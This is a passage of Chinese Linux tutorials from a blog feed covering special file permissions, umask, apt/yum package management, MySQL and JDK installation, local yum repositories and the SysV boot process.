<p>sgid数字权限是2000，设置方法：</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">方式<span class="number">1</span>：</span><br><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># chmod 2755 test/</span></span><br><span class="line">方式<span class="number">2</span>：</span><br><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># chmod g+s test/</span></span><br><span class="line"></span><br><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># ll -d test/</span></span><br><span class="line">drwxr-sr-x <span class="number">2</span> root root <span class="number">4096</span> Nov <span class="number">22</span> <span class="number">21</span>:<span class="number">02</span> test/</span><br><span class="line"><span class="number">1234567</span></span><br></pre></td></tr></table></figure>
<p>在设置SetGID的文件夹创建文件的属组是父目录的属组：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM_0_9_centos ~]# <span class="built_in">cd</span> <span class="built_in">test</span>/</span><br><span class="line">[root@VM_0_9_centos <span class="built_in">test</span>]# su aaa</span><br><span class="line">[aaa@VM_0_9_centos <span class="built_in">test</span>]$ <span class="built_in">touch</span> bbb</span><br><span class="line">[aaa@VM_0_9_centos <span class="built_in">test</span>]$ ll</span><br><span class="line">-rw-rw-r-- 1 aaa  root 0 Nov 22 21:14 bbb</span><br><span class="line">12345</span><br></pre></td></tr></table></figure>
<h4 id="sticky-sbit-粘滞位">sticky(sbit)粘滞位</h4>
<p>**命令功能：**粘滞位，只对目录有效，对某目录设置粘滞位后，普通用户就算有w权限也只能删除该目录下自己建立的文件，而不能删除其他用户建立的文件。</p>
<p>如果该其他用户权限位上有执行权限，则会在其他用户权限位的执行权限上写个t（小写）； 如果该其它用户权限位上没有执行权限，则会在其他用户权限位的执行权限上写个T（大写）。</p>
<p>系统中存在的/tmp目录是经典的粘滞位目录，谁都有写权限，因此安全成问题，常常是木马第一手跳板。</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">[aaa<span class="meta">@VM_0_9_centos</span> <span class="operator">~</span>]$ ll <span class="operator">-</span>d <span class="regexp">/tmp/</span> </span><br><span class="line">drwxrwxrwt. <span class="number">9</span> root root <span class="number">4096</span> <span class="type">Nov</span> <span class="number">22</span> <span class="number">21</span>:<span class="number">15</span> <span class="regexp">/tmp/</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<p>sbit数字权限是1000，设置方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">方法1：</span><br><span class="line">[root@VM_0_9_centos ~]# <span class="built_in">chmod</span> 1755 <span class="built_in">test</span>/</span><br><span class="line">方法2：</span><br><span class="line">[root@VM_0_9_centos ~]# <span class="built_in">chmod</span> o+t <span class="built_in">test</span>/ </span><br><span class="line">查看权限：</span><br><span class="line">[root@VM_0_9_centos ~]# ll -d <span class="built_in">test</span>/    </span><br><span class="line">drwxr-xr-t 2 root root 4096 Nov 22 21:15 <span class="built_in">test</span>/</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure>
<h3 id="chattr权限">chattr权限</h3>
<p>chattr概述：凌驾于r、w、x、suid、sgid之上的权限。</p>
<h4 id="lsattr：查看特殊权限">lsattr：查看特殊权限</h4>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@VM_0_9_centos</span> ~]<span class="comment"># lsattr /etc/passwd</span></span><br><span class="line">-------------e-- <span class="regexp">/etc/passwd</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<h4 id="chattr：设置特殊权限">chattr：设置特殊权限</h4>
<table>
<thead>
<tr>
<th>权限说明</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>-i</td>
<td>锁定文件，不能编辑，不能修改，不能删除，不能移动，可以执行</td>
</tr>
<tr>
<td>-a</td>
<td>仅可以追加文件，不能编辑，不能删除，不能移动，可以执行</td>
</tr>
</tbody>
</table>
<p>防止系统中某个关键文件被修改：</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@VM_0_9_centos</span> ~]<span class="comment"># chattr +i /etc/fstab</span></span><br><span class="line">[root<span class="variable">@VM_0_9_centos</span> ~]<span class="comment"># lsattr /etc/fstab   </span></span><br><span class="line">----i--------e-- <span class="regexp">/etc/fstab</span></span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
<p>让某个文件只能往里面追加内容，不能删除，一些日志文件适用于这种操作：</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># chattr +a user_act.log</span></span><br><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># lsattr user_act.log </span></span><br><span class="line">-----a-------e-- user_act.<span class="built_in">log</span></span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
<h3 id="掩码umask">掩码umask</h3>
<h4 id="umask的作用">umask的作用</h4>
<p>umask值用于设置用户在创建文件时的默认权限，当我们在系统中创建目录或文件时，目录或文件所具有的默认权限就是由umask值决定的。</p>
<p>对于root用户，系统默认的umask值是0022；对于普通用户，系统默认的umask值是0002。执行umask命令可以查看当前用户的umask值。</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># umask</span></span><br><span class="line"><span class="number">0022</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<h4 id="umask是如何改变新文件的权限">umask是如何改变新文件的权限</h4>
<p>umask值一共有4组数字，其中第1组数字用于定义特殊权限，一般不予考虑，与一般权限有关的是后3组数字。</p>
<p>默认情况下，对于目录，用户所能拥有的最大权限是777；对于文件，用户所能拥有的最大权限是目录的最大权限去掉执行权限，即666。因为x执行权限对于目录是必须的，没有执行权限就无法进入目录，而对于文件则不必默认赋予x执行权限。</p>
<p>对于root用户，他的umask值是022。当root用户创建目录时，默认的权限就是用最大权限777去掉相应位置的umask值权限，即对于所有者不必去掉任何权限，对于所属组要去掉w权限，对于其他用户也要去掉w权限，所以目录的默认权限就是755；当root用户创建文件时，默认的权限则是用最大权限666去掉相应位置的umask值，即文件的默认权限是644。</p>
<p>通过umask命令可以修改umask值，比如将umask值设为0077。</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># umask 0077</span></span><br><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># umask</span></span><br><span class="line"><span class="number">0077</span></span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
<h4 id="永久修改umask">永久修改umask</h4>
<p>umask命令只能临时修改umask值，系统重启之后umask将还原成默认值。如果要永久修改umask值，可修改<code>/etc/bashrc</code>或<code>/etc/profile</code>文件。</p>
<p>例如要将默认umask值设置为027，那么可以在文件中增加一行<code>umask 027</code>。</p>
<p>本文参考：</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】Linux软件安装</title>
    <url>/posts/5d71294b/</url>
    <content><![CDATA[<h2 id="Ubuntu软件安装与卸载">Ubuntu软件安装与卸载</h2>
<h3 id="更新Ubuntu软件下载地址">更新Ubuntu软件下载地址</h3>
<p>开源软件镜像站 ：<a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/">https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/</a></p>
<p>Ubuntu 的软件源配置文件是 <code>/etc/apt/sources.list</code>。将系统自带的该文件做个备份，将该文件替换为下面内容，即可使用 TUNA 的软件源镜像。</p>
<p>ubuntu版本: 16.04 LTS</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 预发布软件源，不建议启用</span></span><br><span class="line"><span class="comment"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse</span></span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse</span></span><br></pre></td></tr></table></figure>
<p>然后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> /etc/apt/sources.list /etc/apt/sources.list.backup</span><br></pre></td></tr></table></figure>
<p>再sudo vim /etc/apt/sources.list修改为以上内容</p>
<h3 id="Ubuntu软件操作的相关命令">Ubuntu软件操作的相关命令</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get update  更新源</span><br><span class="line"><span class="built_in">sudo</span> apt-get install package 安装包</span><br><span class="line"><span class="built_in">sudo</span> apt-get remove package 删除包</span><br><span class="line"><span class="built_in">sudo</span> apt-cache search package 搜索软件包</span><br><span class="line"><span class="built_in">sudo</span> apt-cache show package  获取包的相关信息，如说明、大小、版本等</span><br><span class="line"><span class="built_in">sudo</span> apt-get install package --reinstall   重新安装包</span><br><span class="line"><span class="built_in">sudo</span> apt-get -f install   修复安装</span><br><span class="line"><span class="built_in">sudo</span> apt-get remove package --purge 删除包，包括配置文件等</span><br><span class="line"><span class="built_in">sudo</span> apt-get build-dep package 安装相关的编译环境</span><br><span class="line"><span class="built_in">sudo</span> apt-get upgrade 更新已安装的包</span><br><span class="line"><span class="built_in">sudo</span> apt-get dist-upgrade 升级系统</span><br><span class="line"><span class="built_in">sudo</span> apt-cache depends package 了解使用该包依赖那些包</span><br><span class="line"><span class="built_in">sudo</span> apt-cache rdepends package 查看该包被哪些包依赖</span><br><span class="line"><span class="built_in">sudo</span> apt-get <span class="built_in">source</span> package  下载该包的源代码</span><br><span class="line"><span class="built_in">sudo</span> apt-get clean &amp;&amp; <span class="built_in">sudo</span> apt-get autoclean 清理无用的包</span><br><span class="line"><span class="built_in">sudo</span> apt-get check 检查是否有损坏的依赖</span><br></pre></td></tr></table></figure>
<h2 id="yum安装命令">yum安装命令</h2>
<p>yum（ Yellow dog Updater, Modified）是一个在Fedora和RedHat以及SUSE中的Shell前端软件包管理器。</p>
<p>基於RPM包管理，能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软体包，无须繁琐地一次次下载、安装。</p>
<p>yum提供了查找、安装、删除某一个、一组甚至全部软件包的命令，而且命令简洁而又好记。</p>
<h3 id="更新国内yum源">更新国内yum源</h3>
<p>网易（163）yum源是国内最好的yum源之一 ，无论是速度还是软件版本，都非常的不错。</p>
<p>将yum源设置为163 yum，可以提升软件包安装和更新的速度，同时避免一些常见软件版本无法找到。</p>
<p>首先备份/etc/yum.repos.d/CentOS-Base.repo</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br></pre></td></tr></table></figure>
<p>下载对应版本 repo 文件, 放入 /etc/yum.repos.d/</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="http://mirrors.163.com/.help/CentOS5-Base-163.repo">CentOS5</a> ：<a href="http://mirrors.163.com/.help/CentOS5-Base-163.repo">http://mirrors.163.com/.help/CentOS5-Base-163.repo</a></p>
</li>
<li class="lvl-2">
<p><a href="http://mirrors.163.com/.help/CentOS6-Base-163.repo">CentOS6</a> ：<a href="http://mirrors.163.com/.help/CentOS6-Base-163.repo">http://mirrors.163.com/.help/CentOS6-Base-163.repo</a></p>
</li>
<li class="lvl-2">
<p><a href="http://mirrors.163.com/.help/CentOS7-Base-163.repo">CentOS7</a> ：<a href="http://mirrors.163.com/.help/CentOS7-Base-163.repo">http://mirrors.163.com/.help/CentOS7-Base-163.repo</a></p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://mirrors.163.com/.help/CentOS7-Base-163.repo</span><br><span class="line"><span class="built_in">mv</span> CentOS7-Base-163.repo /etc/yum.repos.d/CentOS-Base.repo</span><br></pre></td></tr></table></figure>
<p>运行以下命令生成缓存</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum clean all</span><br><span class="line">yum makecache</span><br></pre></td></tr></table></figure>
<p>除了网易之外，国内还有其他不错的 yum 源，比如中科大和搜狐。</p>
<p>中科大的 yum 源，安装方法查看：<a href="https://lug.ustc.edu.cn/wiki/mirrors/help/centos">https://lug.ustc.edu.cn/wiki/mirrors/help/centos</a></p>
<p>sohu 的 yum 源安装方法查看: <a href="http://mirrors.sohu.com/help/centos.html">http://mirrors.sohu.com/help/centos.html</a></p>
<h3 id="yum常用命令">yum常用命令</h3>
<p>yum 语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum [options] [<span class="built_in">command</span>] [package ...]</span><br></pre></td></tr></table></figure>
<p>选项：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>**options：**可选，选项包括-h（帮助），-y（当安装过程提示选择全部为&quot;yes&quot;），-q（不显示安装的过程）等等。</p>
</li>
<li class="lvl-2">
<p>**command：**要进行的操作。</p>
</li>
<li class="lvl-2">
<p>**package：**操作的对象。</p>
</li>
</ul>
<p>实例：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>列出所有可更新的软件清单命令：<code>yum check-update</code></p>
</li>
<li class="lvl-2">
<p>更新所有软件命令：<code>yum update</code></p>
</li>
<li class="lvl-2">
<p>仅安装指定的软件命令：<code>yum install &lt;package_name&gt;</code></p>
</li>
<li class="lvl-2">
<p>仅更新指定的软件命令：<code>yum update &lt;package_name&gt;</code></p>
</li>
<li class="lvl-2">
<p>显示包信息：<code>yum info &lt;package_name&gt;</code></p>
</li>
<li class="lvl-2">
<p>列出所有可安裝的软件清单命令：<code>yum list</code></p>
</li>
<li class="lvl-2">
<p>删除软件包命令：<code>yum remove &lt;package_name&gt;</code></p>
</li>
<li class="lvl-2">
<p>查找软件包 命令：<code>yum search &lt;keyword&gt;</code></p>
</li>
<li class="lvl-2">
<p>清除缓存命令:</p>
<ul class="lvl-2">
<li class="lvl-4">yum clean packages: 清除缓存目录下的软件包</li>
<li class="lvl-4">yum clean headers: 清除缓存目录下的 headers</li>
<li class="lvl-4">yum clean oldheaders: 清除缓存目录下旧的 headers</li>
<li class="lvl-4">yum clean, yum clean all (= yum clean packages; yum clean oldheaders) :清除缓存目录下的软件包及旧的headers</li>
</ul>
</li>
</ul>
<h3 id="yum在线安装MySQL5-7">yum在线安装MySQL5.7</h3>
<p>Step1: 检测系统是否自带安装mysql</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum list installed | grep mysql</span><br></pre></td></tr></table></figure>
<p>Step2: 删除系统自带的mysql及其依赖</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y remove mysql-libs.x86_64</span><br></pre></td></tr></table></figure>
<p>Step3: 给CentOS添加rpm源，并且选择较新的源</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm</span><br><span class="line">yum localinstall mysql-community-release-el7-5.noarch.rpm</span><br><span class="line">yum repolist all | grep mysql</span><br><span class="line">yum-config-manager --<span class="built_in">disable</span> mysql55-community</span><br><span class="line">yum-config-manager --<span class="built_in">disable</span> mysql56-community</span><br><span class="line">yum-config-manager --<span class="built_in">enable</span> mysql57-community-dmr</span><br><span class="line">yum repolist enabled | grep mysql</span><br></pre></td></tr></table></figure>
<p>Step4:安装mysql 服务器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install mysql-community-server</span><br></pre></td></tr></table></figure>
<p>Step5: 启动mysql</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service mysqld start</span><br></pre></td></tr></table></figure>
<p>grep “password” /var/log/mysqld.log(查看临时密码)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SET PASSWORD = PASSWORD(<span class="string">&#x27;your new password&#x27;</span>);</span><br><span class="line">ALTER USER <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> PASSWORD EXPIRE NEVER;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
<p>默认的要求必须的设置格式：<br>
<strong>包含数字、小写或大写字母以及特殊字符</strong></p>
<p>默认的要求必须的设置格式：<br>
<strong>包含数字、小写或大写字母以及特殊字符</strong></p>
<p>如果不想复杂，可以使用以下方式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> global validate_password_policy=0;</span><br><span class="line"><span class="built_in">set</span> global validate_password_length=1;</span><br></pre></td></tr></table></figure>
<p>Step6: 查看mysql是否自启动,并且设置开启自启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># chkconfig --list | grep mysqld</span></span><br><span class="line"><span class="comment"># chkconfig mysqld on</span></span><br></pre></td></tr></table></figure>
<p>Step7: mysql安全设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure>
<h3 id="rpm">rpm</h3>
<p>RPM是Red Hat公司随Redhat Linux推出了一个软件包管理器，通过它能够更加轻松容易地实现软件的安装。</p>
<p>常见用法：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>rpm -ivh &lt;rpm包名&gt; 安装软件</p>
</li>
<li class="lvl-2">
<p>rpm -e &lt;rpm包名&gt; 卸载安装</p>
</li>
<li class="lvl-2">
<p>rpm -qi &lt;rpm包名&gt; 显示软件安装信息</p>
</li>
<li class="lvl-2">
<p>rpm -qa | grep xxx 查询软件是否安装（包括相关依赖）</p>
</li>
<li class="lvl-2">
<p>rpm -Uvh &lt;rpm包名&gt; 升级一个rpm</p>
</li>
</ul>
<p>具体参数详解：<br>
-i, --install 安装包<br>
-v, --verbose 列出更多详细信息，安装进度<br>
-h, --hash 安装时列出hash标记 (与 -v连用)<br>
-e, --erase 卸载安装包<br>
-U, --upgrade=+ 升级包<br>
–replacepkge 无论软件包是否已被安装，都强行安装软件包<br>
–test 安装测试，并不实际安装<br>
–nodeps 忽略软件包的依赖关系强行安装<br>
–force 忽略软件包及文件的冲突<br>
-q,–query:<br>
-a, --all 查询/校验所有的安装包<br>
-p, --package 查询/校验一个安装文件<br>
-l, --list 列出安装文件<br>
-d, --docfiles 列出所有文档文件<br>
-f, --file 查询/校验安装包中所包含的文件</p>
<p>安装软件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rpm -hvi dejagnu-1.4.2-10.noarch.rpm </span></span><br><span class="line">警告：dejagnu-1.4.2-10.noarch.rpm: V3 DSA 签名：NOKEY, key ID db42a60e</span><br><span class="line">准备...           </span><br><span class="line"><span class="comment">########################################### [100%]</span></span><br></pre></td></tr></table></figure>
<p>显示软件安装信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rpm -qi dejagnu-1.4.2-10.noarch.rpm</span></span><br><span class="line"></span><br><span class="line">【第1次更新 教程、类似命令关联】</span><br></pre></td></tr></table></figure>
<h3 id="安装JDK">安装JDK</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.上传jdk-7u45-linux-x64.tar.gz到Linux上</span><br><span class="line">2.解压jdk到/usr/local目录</span><br><span class="line">tar -zxvf jdk-7u45-linux-x64.tar.gz -C /usr/local/</span><br><span class="line">3.设置环境变量，在/etc/profile文件最后追加相关内容(技巧r:!<span class="built_in">pwd</span>)</span><br><span class="line">vi /etc/profile</span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/local/jdk1.7.0_45</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$JAVA_HOME</span>/bin</span><br><span class="line">4.刷新环境变量</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line">5.测试java命令是否可用</span><br><span class="line">java -version</span><br></pre></td></tr></table></figure>
<h3 id="制作本地YUM源">制作本地YUM源</h3>
<p>上传CentOS-6.7-x86_64-bin-DVD1.iso到服务器</p>
<p>将CentOS-6.7-x86_64-bin-DVD1.iso镜像挂载到某个目录:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /var/iso</span><br><span class="line">mount -o loop CentOS-6.7-x86_64-bin-DVD1.iso /var/iso</span><br></pre></td></tr></table></figure>
<p>安装并启动Apache服务器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y httpd</span><br><span class="line">service httpd start</span><br></pre></td></tr></table></figure>
<p>使用浏览器访问<a href="http://192.168.100.101">http://192.168.100.101</a>（如果访问不通，检查防火墙是否开启了80端口或关闭防火墙）</p>
<p>将YUM源配置到httpd中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> -r /var/iso/ /var/www/html/CentOS-6.7</span><br><span class="line">umount /var/iso</span><br></pre></td></tr></table></figure>
<p>在浏览器中访问<a href="http://192.168.100.101/CentOS-6.7/">http://192.168.100.101/CentOS-6.7/</a></p>
<p><img src="/posts/5d71294b//5c1df1e303458b97c3fcde9babdec6c8.jpeg" alt="img"></p>
<p><strong>配置使用YUM源：</strong></p>
<p>备份原有的YUM源的配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/yum.repos.d/</span><br><span class="line">rename .repo .repo.bak *</span><br></pre></td></tr></table></figure>
<p>修改YUM源配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi CentOS-Local.repo</span><br><span class="line">[base]</span><br><span class="line">name=CentOS-Local</span><br><span class="line">baseurl=http://192.168.100.101/CentOS-6.7</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=1   <span class="comment">#很重要，1才启用</span></span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6</span><br></pre></td></tr></table></figure>
<p>重建yum缓存</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#清除yum缓存文件，重新新建</span></span><br><span class="line">yum clean all &amp;&amp; yum makecache</span><br><span class="line"><span class="comment">#列出可用的YUM源</span></span><br><span class="line">yum repolist</span><br></pre></td></tr></table></figure>
<h3 id="rpm包生成yum源目录">rpm包生成yum源目录</h3>
<p>如果已经下载好了rpm包，可以自行制作一个yum源（yum仓库）。将下载的rpm包上传到centos服务器上（比如/data/rpm目录下），然后进入存放rpm包的目录，执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /data/rpm</span></span><br><span class="line"><span class="comment"># createrepo .</span></span><br></pre></td></tr></table></figure>
<p>这样，rpm包存放的目录就可以作为yum源目录使用。如果提示找不到createrepo命令，可以使用yum install createrepo安装该程序。</p>
<p>本文参考：</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】Linux系统启动过程</title>
    <url>/posts/26e49edf/</url>
    <content><![CDATA[<h2 id="Linux系统启动过程">Linux系统启动过程</h2>
<p>Linux系统的启动过程可以分为5个阶段：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>内核的引导。</p>
</li>
<li class="lvl-2">
<p>运行 init。</p>
</li>
<li class="lvl-2">
<p>系统初始化。</p>
</li>
<li class="lvl-2">
<p>建立终端 。</p>
</li>
<li class="lvl-2">
<p>用户登录系统。</p>
</li>
</ul>
<hr>
<h3 id="加载内核">加载内核</h3>
<p>当计算机打开电源后，首先是BIOS开机自检，按照BIOS中设置的启动设备（通常是硬盘）来启动。</p>
<p>操作系统接管硬件以后，首先读入 /boot 目录下的内核文件。</p>
<p><img src="/posts/26e49edf//1dbe9c625b5fe87278c65952f7c6736a.png" alt="img"></p>
<h3 id="启动初始化进程init">启动初始化进程init</h3>
<p>内核文件加载以后，就开始运行第一个程序 /sbin/init，它的作用是初始化系统环境。</p>
<p>init程序首先是需要读取配置文件/etc/inittab。</p>
<blockquote>
<p>CentOS 各版本init配置文件的位置：</p>
<ul class="lvl-1">
<li class="lvl-2"><strong>SysV:</strong> init, CentOS 5之前, 配置文件： /etc/inittab。</li>
<li class="lvl-2"><strong>Upstart:</strong> init,CentOS 6, 配置文件： /etc/inittab, /etc/init/*.conf。</li>
<li class="lvl-2"><strong>Systemd：</strong> systemd, CentOS 7,配置文件： /usr/lib/systemd/system、 /etc/systemd/system。</li>
</ul>
</blockquote>
<p><img src="/posts/26e49edf//738b4978d388849ac7518211f8cc564c.png" alt="1574411888879"></p>
<p>由于init是第一个运行的程序，它的进程编号（pid）就是1。其他所有进程都从它衍生，都是它的子进程。</p>
<h3 id="确定运行级别">确定运行级别</h3>
<p>许多程序需要开机启动。它们在Windows叫做&quot;服务&quot;（service），在Linux就叫做&quot;守护进程&quot;（daemon）。</p>
<p>init进程的一大任务，就是去运行这些开机启动的程序。</p>
<p>但是，不同的场合需要启动不同的程序，比如用作服务器时，需要启动Apache，用作桌面就不需要。</p>
<p>Linux允许为不同的场合，分配不同的开机启动程序，这就叫做&quot;运行级别&quot;（runlevel）。也就是说，启动时根据&quot;运行级别&quot;，确定要运行哪些程序。</p>
<p><img src="/posts/26e49edf//bd1879efce8431f6e4f2e8267497e91c.png" alt="1574411922140"></p>
<p>Linux系统有7个运行级别(runlevel)：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>运行级别0：系统停机状态，系统默认运行级别不能设为0，否则不能正常启动</p>
</li>
<li class="lvl-2">
<p>运行级别1：单用户工作状态，root权限，用于系统维护，禁止远程登陆</p>
</li>
<li class="lvl-2">
<p>运行级别2：多用户状态(没有NFS)</p>
</li>
<li class="lvl-2">
<p>运行级别3：完全的多用户状态(有NFS)，登陆后进入控制台命令行模式</p>
</li>
<li class="lvl-2">
<p>运行级别4：系统未使用，保留</p>
</li>
<li class="lvl-2">
<p>运行级别5：X11控制台，登陆后进入图形GUI模式</p>
</li>
<li class="lvl-2">
<p>运行级别6：系统正常关闭并重启，默认运行级别不能设为6，否则不能正常启动</p>
</li>
</ul>
<p>可以使用运行级别执行关机或重启：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">init</span> <span class="number">0</span>	关机</span><br><span class="line"><span class="attribute">init</span> <span class="number">6</span>	重启</span><br><span class="line"><span class="attribute">12</span></span><br></pre></td></tr></table></figure>
<h3 id="加载开机启动程序">加载开机启动程序</h3>
<p>在init的配置文件中有这么一行： <code>si::sysinit:/etc/rc.d/rc.sysinit</code>它调用执行了/etc/rc.d/rc.sysinit，而rc.sysinit是一个bash shell的脚本，它主要是完成一些系统初始化的工作，rc.sysinit是每一个运行级别都要首先运行的重要脚本。</p>
<p>它主要完成的工作有：激活交换分区，检查磁盘，加载硬件模块以及其它一些需要优先执行任务。</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">l5:</span><span class="number">5</span><span class="symbol">:wait</span><span class="symbol">:/etc/rc</span>.d/rc <span class="number">5</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>这一行表示以5为参数运行/etc/rc.d/rc，/etc/rc.d/rc是一个Shell脚本，它接受5作为参数，去执行/etc/rc.d/rc5.d/目录下的所有的rc启动脚本，/etc/rc.d/rc5.d/目录中的这些启动脚本实际上都是一些连接文件，而不是真正的rc启动脚本，真正的rc启动脚本实际上都是放在/etc/rc.d/init.d/目录下。</p>
<p>而这些rc启动脚本有着类似的用法，它们一般能接受start、stop、restart、status等参数。</p>
<p>/etc/rc.d/rc5.d/中的rc启动脚本通常是K或S开头的连接文件，对于以 S 开头的启动脚本，将以start参数来运行。</p>
<p>而如果发现存在相应的脚本也存在K打头的连接，而且已经处于运行态了(以/var/lock/subsys/下的文件作为标志)，则将首先以stop为参数停止这些已经启动了的守护进程，然后再重新运行。</p>
<p>这样做是为了保证是当init改变运行级别时，所有相关的守护进程都将重启。</p>
<p>至于在每个运行级中将运行哪些守护进程，用户可以通过chkconfig或setup中的&quot;System Services&quot;来自行设定。</p>
<p><img src="/posts/26e49edf//7cee4633821586e191c96ed958888671.png" alt="1574413056057"></p>
<h3 id="用户登录">用户登录</h3>
<p>一般来说，用户的登录方式有三种：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>（1）命令行登录</p>
</li>
<li class="lvl-2">
<p>（2）ssh登录</p>
</li>
<li class="lvl-2">
<p>（3）图形界面登录</p>
</li>
</ul>
<p><img src="/posts/26e49edf//ee92be977534d532ff7f7dd73799dc67.png" alt="1574413193850"></p>
